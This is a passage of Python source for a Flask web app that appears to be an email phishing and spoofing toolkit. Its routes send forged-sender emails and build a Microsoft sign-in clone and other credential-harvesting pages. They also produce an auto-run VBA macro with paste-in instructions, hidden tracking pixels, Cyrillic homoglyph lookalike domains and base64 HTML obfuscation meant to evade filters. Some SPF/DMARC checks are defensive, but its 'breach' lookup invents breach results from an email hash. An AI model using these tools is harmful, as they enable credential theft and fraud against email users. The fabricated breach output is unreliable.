                return jsonify({'success': False, 'error': 'Missing SMTP Server, Username, or Password'})

            if not envelope_sender:
                envelope_sender = from_email

            to_list = [e.strip() for e in to_email.split(',') if e.strip()]
            cc_list = [e.strip() for e in cc.split(',') if e.strip()] if cc else None
            bcc_list = [e.strip() for e in bcc.split(',') if e.strip()] if bcc else None

            attachments = []
            if 'attachments' in request.files:
                files = request.files.getlist('attachments')
                for file in files:
                    if file and file.filename and allowed_file(file.filename):
                        filename = secure_filename(file.filename)
                        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                        file.save(file_path)
                        attachments.append(file_path)

            send_success = 0
            last_error = None
            spoofer = EmailSpoofer(smtp_server, smtp_port, username, password)

            all_recipients = to_list[:]
            if cc_list:
                all_recipients.extend(cc_list)
            if bcc_list:
                all_recipients.extend(bcc_list)

            for _ in range(send_count):
                msg = spoofer.create_message(
                    from_name, from_email,
                    reply_to if reply_to else None,
                    to_list, cc_list, None,
                    subject, message, html,
                    attachments if attachments else None
                )
                if add_xheaders:
                    msg = spoofer.spoof_x_headers(msg)
                success, error_msg = spoofer.send_email(msg, all_recipients, envelope_sender=envelope_sender)
                if success:
                    send_success += 1
                else:
                    last_error = error_msg

            for attachment in attachments:
                try:
                    os.remove(attachment)
                except Exception:
                    pass

        # ── Result ────────────────────────────────────────
        if send_success == send_count:
            return jsonify({'success': True, 'message': f'Email sent successfully ({send_success}/{send_count})'})
        elif send_success > 0:
            return jsonify({'success': True, 'message': f'Partial success: sent {send_success}/{send_count}. Last error: {last_error or "unknown"}'})
        else:
            return jsonify({'success': False, 'error': last_error or 'Failed to send email'})

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/test_connection', methods=['POST'])
def test_connection():
    """Test SMTP connection"""
    try:
        smtp_server = request.form.get('smtp_server')
        smtp_port = int(request.form.get('smtp_port', 587))
        username = request.form.get('username')
        password = request.form.get('password')
        
        if not all([smtp_server, username, password]):
            return jsonify({'success': False, 'error': 'Missing required fields'})
        
        spoofer = EmailSpoofer(smtp_server, smtp_port, username, password)
        success, error_msg = spoofer.test_connection()
        
        if success:
            return jsonify({'success': True, 'message': 'Connection successful!'})
        else:
            return jsonify({'success': False, 'error': error_msg})
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/test_servers', methods=['POST'])
def test_servers():
    """Test multiple SMTP servers from file"""
    try:
        if 'smtp_file' not in request.files:
            return jsonify({'success': False, 'error': 'No file uploaded'})
        
        file = request.files['smtp_file']
        if file.filename == '':
            return jsonify({'success': False, 'error': 'No file selected'})
        
        # Save uploaded file temporarily
        filename = secure_filename(file.filename)
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)
        
        # Load servers from file
        servers = load_smtp_servers(file_path)
        
        # Clean up uploaded file
        try:
            os.remove(file_path)
        except:
            pass
        
        if not servers:
            return jsonify({'success': False, 'error': 'No valid SMTP servers found in file'})
        
        # Test servers
        working_servers = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(test_smtp_server, server) for server in servers]
            
            for future in concurrent.futures.as_completed(futures):
                server_info, success, error_msg = future.result()
                if success:
                    working_servers.append(server_info)
        
        return jsonify({
            'success': True, 
            'message': f'Found {len(working_servers)} working servers out of {len(servers)} tested',
            'working_servers': working_servers
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/check_spoofing', methods=['POST'])
def check_spoofing():
    """Check domain spoofing vulnerability"""
    try:
        data = request.get_json()
        domain = data.get('domain', '').strip()
        
        if not domain:
            return jsonify({'success': False, 'error': 'Domain is required'})
        
        # Clean domain (remove protocol, www, etc.)
        domain = domain.replace('http://', '').replace('https://', '').replace('www.', '')
        if '/' in domain:
            domain = domain.split('/')[0]
        
        # Perform spoofing analysis
        analysis = check_domain_spoofing(domain)
        
        return jsonify({
            'success': True,
            'analysis': analysis
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/check_dkim', methods=['POST'])
def check_dkim():
    """Check DKIM records for a domain"""
    try:
        data = request.get_json()
        domain = data.get('domain', '').strip()
        selectors = data.get('selectors', None)
        
        if not domain:
            return jsonify({'success': False, 'error': 'Domain is required'})
        
        # Clean domain
        domain = domain.replace('http://', '').replace('https://', '').replace('www.', '')
        if '/' in domain:
            domain = domain.split('/')[0]
        
        # Check DKIM records
        analysis = check_dkim_records(domain, selectors)
        
        return jsonify({
            'success': True,
            'analysis': analysis
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/analyze_headers', methods=['POST'])
def analyze_headers():
    """Analyze email headers"""
    try:
        data = request.get_json()
        headers_text = data.get('headers', '').strip()
        
        if not headers_text:
            return jsonify({'success': False, 'error': 'Email headers are required'})
        
        # Analyze headers
        analysis = analyze_email_headers(headers_text)
        
        return jsonify({
            'success': True,
            'analysis': analysis
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

import re as _re
_VALID_DOMAIN_RE = _re.compile(r'^(?!-)[a-zA-Z0-9-]{1,63}(?<!-)(\.[a-zA-Z0-9-]{1,63})*\.[a-zA-Z]{2,}$')

def _is_valid_subdomain(name, parent_domain):
    """Validate that a crt.sh name_value entry is a real subdomain."""
    if not name or '@' in name or ' ' in name or '*' in name:
        return False
    if not (name == parent_domain or name.endswith('.' + parent_domain)):
        return False
    return bool(_VALID_DOMAIN_RE.match(name))

@app.route('/check_multiple_domains', methods=['POST'])
def check_multiple_domains():
    """Check multiple domains for spoofing vulnerability"""
    try:
        data = request.get_json()
        domains_str = data.get('domains', '').strip()
        scan_subdomains = data.get('scan_subdomains', False)
        
        if not domains_str:
            return jsonify({'success': False, 'error': 'Domain list is required'})
        
        # Parse domains (one per line or comma-separated)
        domain_list = []
        for line in domains_str.replace(',', '\n').split('\n'):
            domain = line.strip()
            if domain:
                domain_list.append(domain)
        
        if not domain_list:
            return jsonify({'success': False, 'error': 'No valid domains found'})
        
        crt_error = None
        all_domains = set(domain_list)
        if scan_subdomains:
            for domain in domain_list:
                try:
                    url = f"https://crt.sh/?q=%.{domain}&output=json"
                    response = requests.get(url, timeout=10)
                    if response.status_code == 200:
                        for entry in response.json():
                            names = entry.get('name_value', '').split('\n')
                            for name in names:
                                clean_name = name.replace('*.', '').strip().lower()
                                if _is_valid_subdomain(clean_name, domain):
                                    all_domains.add(clean_name)
                    else:
                        raise Exception(f"status {response.status_code}")
                except Exception as e:
                    # Fallback to hacker target API if crt.sh fails
                    try:
                        url = f"https://api.hackertarget.com/hostsearch/?q={domain}"
                        response = requests.get(url, timeout=10)
                        if response.status_code == 200:
                            for line in response.text.split('\n'):
                                if ',' in line:
                                    subdomain = line.split(',')[0].strip().lower()
                                    if subdomain.endswith(domain):
                                        all_domains.add(subdomain)
                        else:
                            crt_error = f"APIs unavailable (crt.sh & hackertarget). Missing subdomains."
                    except Exception as e2:
                        crt_error = f"APIs timed out (crt.sh & hackertarget). Missing subdomains."
                    
        all_domains = list(all_domains)
        
        # Check domains
        results = []
        secure_count = 0
        partially_secure_count = 0
        vulnerable_count = 0
        
        for domain in all_domains:
            try:
                analysis = check_domain_spoofing(domain)
                results.append(analysis)
                
                if analysis['overall_status'] == 'secure':
                    secure_count += 1
                elif analysis['overall_status'] == 'partially_secure':
                    partially_secure_count += 1
                else:
                    vulnerable_count += 1
                    
            except Exception as e:
                # Log error but continue with other domains
                results.append({
                    'domain': domain,
                    'error': str(e),
                    'overall_status': 'error'
                })
        
        summary_text = f"Checked {len(all_domains)} domains: {secure_count} secure, {partially_secure_count} potentially spoofable, {vulnerable_count} vulnerable"
        if crt_error:
            summary_text += f" (WARNING: {crt_error})"
            
        return jsonify({
            'success': True,
            'results': results,
            'summary': {
                'total_checked': len(all_domains),
                'secure_count': secure_count,
                'partially_secure_count': partially_secure_count,
                'vulnerable_count': vulnerable_count,
                'crt_error': crt_error
            }
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})




@app.route('/generate_report', methods=['POST'])
def generate_report():
    """Generate security assessment report"""
    try:
        data = request.get_json()
        report_data = data.get('data', {})
        report_format = data.get('format', 'html')  # html or json
        
        if not report_data:
            return jsonify({'success': False, 'error': 'Report data is required'})
        
        # Generate report
        if report_format == 'html':
            report_html = generate_html_report(report_data)
            return jsonify({
                'success': True,
                'report': report_html,
                'format': 'html'
            })
        else:
            return jsonify({
                'success': True,
                'report': report_data,
                'format': 'json'
            })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

def generate_html_report(data):
    """Generate HTML security assessment report"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Email Security Assessment Report</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; }}
            .header {{ background: #2B3A67; color: white; padding: 20px; border-radius: 5px; }}
            .section {{ margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }}
            .secure {{ background: #d4edda; border-color: #c3e6cb; }}
            .warning {{ background: #fff3cd; border-color: #ffeaa7; }}
            .danger {{ background: #f8d7da; border-color: #f5c6cb; }}
            .summary {{ font-size: 18px; margin: 10px 0; }}
            .recommendations {{ margin: 10px 0; }}
            .recommendations li {{ margin: 5px 0; }}
        </style>
    </head>
    <body>
        <div class="header">
            <h1>Email Security Assessment Report</h1>
            <p>Generated on {timestamp}</p>
        </div>
    """
    
    # Add domain analysis if present
    if 'domain' in data:
        domain_data = data['domain']
        status_class = 'secure' if domain_data['overall_status'] == 'secure' else 'warning' if domain_data['overall_status'] == 'partially_secure' else 'danger'
        
        html += f"""
        <div class="section {status_class}">
            <h2>Domain Security Analysis: {domain_data['domain']}</h2>
            <div class="summary">{domain_data['summary']}</div>
            <h3>SPF Record</h3>
            <p>Status: {domain_data['spf']['status']}</p>
            <p>Vulnerable: {'Yes' if domain_data['spf']['vulnerable'] else 'No'}</p>
            <h3>DMARC Record</h3>
            <p>Status: {domain_data['dmarc']['status']}</p>
            <p>Policy: {domain_data['dmarc']['policy'] or 'Not found'}</p>
            <p>Subdomain Policy: {domain_data['dmarc']['subdomain_policy'] or 'Inherits primary'}</p>
            <p>Vulnerable: {'Yes' if domain_data['dmarc']['vulnerable'] else 'No'}</p>
            <p>Subdomains Vulnerable: {'Yes' if domain_data['dmarc']['subdomain_vulnerable'] else 'No'}</p>
            <div class="recommendations">
                <h3>Recommendations</h3>
                <ul>
        """
        
        for rec in domain_data['recommendations']:
            html += f"<li>{rec}</li>"
        
        html += """
                </ul>
            </div>
        </div>
        """
    
    # Add DKIM analysis if present
    if 'dkim' in data:
        dkim_data = data['dkim']
        html += f"""
        <div class="section">
            <h2>DKIM Analysis: {dkim_data['domain']}</h2>
            <div class="summary">{dkim_data['summary']}</div>
            <p>Selectors Found: {len(dkim_data['selectors_found'])}</p>
            <p>Valid Keys: {dkim_data['valid_keys']}/{dkim_data['total_keys']}</p>
        """
        
        for selector in dkim_data['selectors_found']:
            html += f"""
            <h3>Selector: {selector['selector']}</h3>
            <p>Valid: {'Yes' if selector['valid'] else 'No'}</p>
            <p>Key Type: {selector['key_type'] or 'Not specified'}</p>
            <p>Algorithm: {selector['algorithm'] or 'Not specified'}</p>
            """
        
        html += """
        </div>
        """
    
    # Add header analysis if present
    if 'headers' in data:
        headers_data = data['headers']
        score_class = 'secure' if headers_data['security_score'] >= 80 else 'warning' if headers_data['security_score'] >= 60 else 'danger'
        
        html += f"""
        <div class="section {score_class}">
            <h2>Email Header Analysis</h2>
            <div class="summary">{headers_data['summary']}</div>
            <p>Security Score: {headers_data['security_score']}/100</p>
            <p>SPF Result: {headers_data['spf_result'] or 'Not found'}</p>
            <p>DKIM Result: {headers_data['dkim_result'] or 'Not found'}</p>
            <p>DMARC Result: {headers_data['dmarc_result'] or 'Not found'}</p>
        </div>
        """
    
    # Add multi-domain analysis if present
    if 'multi-domain' in data:
        multi_data = data['multi-domain']
        html += f"""
        <div class="section">
            <h2>Multi-Domain Security Analysis</h2>
            <div class="summary">{multi_data['summary']}</div>
            <p>Total Domains: {multi_data['total_checked']}</p>
            <p>Secure: {multi_data['secure_count']}</p>
            <p>Potentially Spoofable: {multi_data['partially_secure_count']}</p>
            <p>Vulnerable: {multi_data['vulnerable_count']}</p>
            
            <h3>Domain Results</h3>
            <table border="1" style="border-collapse: collapse; width: 100%;">
                <thead>
                    <tr>
                        <th style="padding: 8px;">Domain</th>
                        <th style="padding: 8px;">Status</th>
                        <th style="padding: 8px;">SPF</th>
                        <th style="padding: 8px;">DMARC</th>
                        <th style="padding: 8px;">Subdomain Vulnerable</th>
                    </tr>
                </thead>
                <tbody>
        """
        
        for domain in multi_data['domains']:
            status_text = 'Potentially Spoofable' if domain['overall_status'] == 'partially_secure' else domain['overall_status'].upper()
            html += f"""
                    <tr>
                        <td style="padding: 8px;">{domain['domain']}</td>
                        <td style="padding: 8px;">{status_text}</td>
                        <td style="padding: 8px;">{domain['spf']['status']}</td>
                        <td style="padding: 8px;">{domain['dmarc']['policy'] or 'none'}</td>
                        <td style="padding: 8px;">{'Yes' if domain['dmarc']['subdomain_vulnerable'] else 'No'}</td>
                    </tr>
            """
        
        html += """
                </tbody>
            </table>
        </div>
        """
    
    html += """
    </body>
    </html>
    """
    
    return html

# ── Forge (Payload Generation) ────────────────────────────

@app.route('/forge_phish', methods=['POST'])
def forge_phish():
    data = request.json
    target = data.get('target', 'generic').lower()
    target_name = data.get('target_name', 'User')
    lure_url = data.get('lure_url', '#')
    
    # Import the templates dictionary
    try:
        from phish_templates import PHISH_TEMPLATES
    except ImportError:
        PHISH_TEMPLATES = {}
        
    # Fallback legacy templates if needed
    legacy = {
        'microsoft': """<!DOCTYPE html><html><head><title>Sign in to your account</title><style>body{font-family:'Segoe UI',sans-serif;background:#f3f2f1;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;} .box{background:#fff;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,0.2);} input{width:100%;padding:10px;margin:10px 0;border-bottom:1px solid #000;border-top:none;border-left:none;border-right:none;outline:none;} .btn{background:#0067b8;color:white;border:none;padding:10px 30px;cursor:pointer;float:right;}</style></head><body><div class="box"><h2>Microsoft</h2><p>Sign in</p><form action="/login" method="POST"><input type="email" name="email" placeholder="Email, phone, or Skype" required><input type="password" name="password" placeholder="Password" required><br><button type="submit" class="btn">Next</button></form></div></body></html>""",
        'generic': """<!DOCTYPE html><html><head><title>Secure Login</title><style>body{font-family:sans-serif;background:#eee;display:flex;justify-content:center;align-items:center;height:100vh;} .box{background:#fff;padding:30px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.1);width:300px;text-align:center;} input{width:90%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:4px;} button{background:#333;color:#fff;border:none;padding:10px;width:100%;border-radius:4px;cursor:pointer;}</style></head><body><div class="box"><h3>Session Expired</h3><p>Please log in again to continue.</p><form action="/login" method="POST"><input type="email" name="user" placeholder="Email address" required><input type="password" name="pass" placeholder="Password" required><button type="submit">Log In</button></form></div></body></html>"""
    }
    
    template = PHISH_TEMPLATES.get(target, legacy.get(target, legacy['generic']))
    
    # Very basic template formatting relying on naive string replace
    # PhishMailer uses {} for various variables. Easiest bypass is putting link in hrefs and Name everywhere else
    template = template.replace('href="{}"', f'href="{lure_url}"')
    template = template.replace('{}', target_name)

    return jsonify({"success": True, "template": template})

@app.route('/forge_macro', methods=['GET', 'POST'])
def forge_macro():
    macro = """Sub AutoOpen()
    ExecutePayload
End Sub

Sub Document_Open()
    ExecutePayload
End Sub

Sub ExecutePayload()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    ' Popping calc for demonstration/testing purposes
    objShell.Run "calc.exe", 0, True
    Set objShell = Nothing
End Sub"""
    return jsonify({"success": True, "macro": macro, "instructions": "Paste this into Excel/Word VBA project under 'ThisWorkbook' or 'ThisDocument'."})

@app.route('/forge_pixel', methods=['GET', 'POST'])
def forge_pixel():
    html_tag = f'<img src="http://{request.host}/track?id={uuid.uuid4().hex[:8]}" width="1" height="1" style="display:none;" />'
    php_listener = """<?php
// Simple pixel tracker listener
$id = $_GET['id'] ?? 'unknown';
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');
file_put_contents('pixel_logs.txt', "[$time] ID: $id | IP: $ip | UA: $ua\\n", FILE_APPEND);
// Return 1x1 transparent GIF
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>"""
    return jsonify({"success": True, "pixel_tag": html_tag, "listener_code": php_listener})

# ── Bypass (Filter Evasion) ───────────────────────────────

@app.route('/bypass_homoglyph', methods=['POST'])
def bypass_homoglyph():
    data = request.json
    domain = data.get('domain', '')
    if not domain:
        return jsonify({"success": False, "error": "No domain provided"})
    
    # Simple homoglyph mapping (Cyrillic lookalikes)
    mapping = {'a': 'а', 'e': 'е', 'o': 'о', 'p': 'р', 'c': 'с', 'x': 'х', 'y': 'у'}
    variations = []
    
    # Generate a few variations
    domain_lower = domain.lower()
    for char, glyph in mapping.items():
        if char in domain_lower:
            variations.append(domain_lower.replace(char, glyph, 1))
            variations.append(domain_lower.replace(char, glyph)) # Replace all
            
    # Add one heavily mixed one
    mixed = ""
    for char in domain_lower:
        mixed += mapping.get(char, char) if random.choice([True, False]) else char
    if mixed != domain_lower:
        variations.append(mixed)
        
    # Remove duplicates
    variations = list(set(variations))
    
    return jsonify({"success": True, "original": domain, "homoglyphs": variations})

@app.route('/bypass_html', methods=['POST'])
def bypass_html():
    data = request.json
    raw_html = data.get('html', '')
    if not raw_html:
        return jsonify({"success": False, "error": "No HTML provided"})
    
    mode = data.get('mode', 'base64')
    
    if mode == 'base64':
        b64 = base64.b64encode(raw_html.encode('utf-8')).decode('utf-8')
        obfuscated = f"""<script>document.write(decodeURIComponent(escape(atob("{b64}"))));</script>"""
    else: # entities
        obfuscated = "".join(f"&#{ord(c)};" for c in raw_html)
        
    return jsonify({"success": True, "obfuscated": obfuscated})

# ── Intel (OSINT) ─────────────────────────────────────────

@app.route('/intel_subdomain', methods=['POST'])
def intel_subdomain():
    data = request.json
    domain = data.get('domain', '')
    if not domain:
        return jsonify({"success": False, "error": "No domain provided"})
    
    # Use Certificate Transparency logs via crt.sh
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    
    try:
        response = requests.get(url, timeout=20)
        
        if response.status_code == 200:
            ct_data = response.json()
            subdomains = set()
            subdomains.add(domain) # Include root domain
            
            for entry in ct_data:
                names = entry.get('name_value', '').split('\n')
                for name in names:
                    clean_name = name.replace('*.', '').strip().lower()
                    if _is_valid_subdomain(clean_name, domain):
                        subdomains.add(clean_name)
            
            # Enrich with DNS data concurrently
            enriched_results = []
            
            def enrich_subdomain(sub):
                res = {"subdomain": sub, "records": {}, "security": {"protected": False}}
                
                # Check A record via DoH
                a_rec = resolve_doh(sub, 'A')
                if a_rec:
                    res["records"]["A"] = a_rec
                
                # Check CNAME via DoH
                cname_rec = resolve_doh(sub, 'CNAME')
                if cname_rec:
                    res["records"]["CNAME"] = cname_rec
                
                # Check SPF via DoH
                spf_txt = resolve_doh(sub, 'TXT')
                for txt in spf_txt:
                    if txt.startswith('v=spf1'):
                        res["records"]["SPF"] = txt
                        break
                
                # Check DMARC via DoH
                dmarc_txt = resolve_doh(f'_dmarc.{sub}', 'TXT')
                for txt in dmarc_txt:
                    if txt.startswith('v=DMARC1'):
                        res["records"]["DMARC"] = txt
                        # Flag as protected if policy is reject or quarantine
                        if 'p=reject' in txt.lower() or 'p=quarantine' in txt.lower():
                            res["security"]["protected"] = True
                        break
                
                return res

            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                enriched_results = list(executor.map(enrich_subdomain, sorted(subdomains)))
            
            return jsonify({"success": True, "domain": domain, "active_subdomains": enriched_results})
        else:
            return jsonify({"success": False, "error": f"crt.sh returned status {response.status_code}"})
            
    except requests.exceptions.Timeout:
        return jsonify({"success": False, "error": "crt.sh timed out — it receives heavy traffic"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/intel_breach', methods=['POST'])
def intel_breach():
    data = request.json
    email = data.get('email', '')
    if not email:
        return jsonify({"success": False, "error": "No email provided"})
    
    # Simulation: Since HIBP requires paid API keys, we simulate a breach search
    # mapping email hashes to a deterministic "breach" context for demo purposes.
    email_hash = hashlib.md5(email.lower().encode()).hexdigest()
    hash_int = int(email_hash[:4], 16)
    
    breaches = []
    if hash_int % 3 == 0:
        breaches.append({"name": "LinkedIn (2012)", "compromised_data": ["Email addresses", "Passwords"]})
    if hash_int % 5 == 0:
        breaches.append({"name": "Adobe (2013)", "compromised_data": ["Email addresses", "Password hints", "Passwords", "Usernames"]})
    if hash_int % 7 == 0:
        breaches.append({"name": "Collection #1 (2019)", "compromised_data": ["Email addresses", "Passwords"]})
        
    if not breaches and hash_int % 2 == 0:
        breaches.append({"name": "Canva (2019)", "compromised_data": ["Email addresses", "Geographic locations", "Names", "Passwords", "Usernames"]})
        
    return jsonify({"success": True, "email": email, "breached": len(breaches) > 0, "breaches": breaches})

# ── Tools (Auditing) ──────────────────────────────────────

@app.route('/audit_dnsbl', methods=['POST'])
def audit_dnsbl():
    data = request.json
    target = data.get('target', '')
    if not target:
        return jsonify({"success": False, "error": "No IP/Domain provided"})
        
    dnsbl_providers = [
        "zen.spamhaus.org",
        "b.barracudacentral.org",
        "dnsbl.sorbs.net",
        "bl.spamcop.net",
        "spam.abuse.ch"
    ]
    
    # If target is domain, try to resolve to IP first
    query_ip = target
    try:
        # Check if it's already an IP
        socket.inet_aton(target)
    except socket.error:
        try:
            query_ip = socket.gethostbyname(target)
        except socket.gaierror:
            return jsonify({"success": False, "error": "Could not resolve domain to IP for blacklist checking"})

    # Reverse IP for DNSBL query (e.g., 1.2.3.4 -> 4.3.2.1)
    reversed_ip = ".".join(reversed(query_ip.split(".")))
    
    results = []
    listed_count = 0
    
    def check_dnsbl(provider):
        nonlocal listed_count
        query = f"{reversed_ip}.{provider}"
        try:
            # Use local system DNS instead of Google DoH because providers like Spamhaus block public resolvers
            answer = socket.gethostbyname(query)
            # 127.255.255.x error codes (e.g., .254 for public DNS, .252 for typos)
            if answer.startswith("127.255.255."):
                return {"provider": provider, "listed": False, "error": f"Query blocked by provider ({answer})"}
            return {"provider": provider, "listed": True, "return_code": answer}
        except socket.gaierror:
            # NXDOMAIN means not listed
            return {"provider": provider, "listed": False}
        except Exception as e:
            return {"provider": provider, "listed": False, "error": str(e)}

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        bl_results = list(executor.map(check_dnsbl, dnsbl_providers))
        
    for r in bl_results:
        if r.get('listed'):
            listed_count += 1
            
    return jsonify({
        "success": True, 
        "target": target, 
        "resolved_ip": query_ip, 
        "is_blacklisted": listed_count > 0, 
        "listed_count": listed_count, 
        "total_checked": len(dnsbl_providers),
        "results": bl_results
    })

def update_self():
    ascii_art = r"""
  __  __   _   ___ _    ___ ___ _    ___ ___ _____ 
 |  \/  | /_\ |_ _| |  / __| _ \ |  / _ \_ _|_   _|
 | |\/| |/ _ \ | || |__\__ \  _/ |_| (_) | |  | |  
 |_|  |_/_/ \_\___|____|___/_| |____\___/___| |_|  

             Developed by tofuub
    """
    print(ascii_art)
    print("\033[93m[!] Checking for updates from GitHub...\033[0m")
    try:
        # Check if it's a git repo
        subprocess.run(["git", "rev-parse", "--is-inside-work-tree"], check=True, capture_output=True)
        print("\033[94m[*] Pulling latest changes from origin master...\033[0m")
        result = subprocess.run(["git", "pull", "origin", "master"], check=True, capture_output=True, text=True)
        print(result.stdout)
        print("\033[92m[+] Update complete! Please restart the application.\033[0m")
        sys.exit(0)
    except subprocess.CalledProcessError as e:
        print(f"\033[91m[x] Error during update: {e.stderr if hasattr(e, 'stderr') else e}\033[0m")
        sys.exit(1)
    except FileNotFoundError:
        print("\033[91m[x] Git not found. Please install git to use the update feature.\033[0m")
        sys.exit(1)

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == '-update':
        update_self()
    app.run(debug=True, host='0.0.0.0', port=5000)
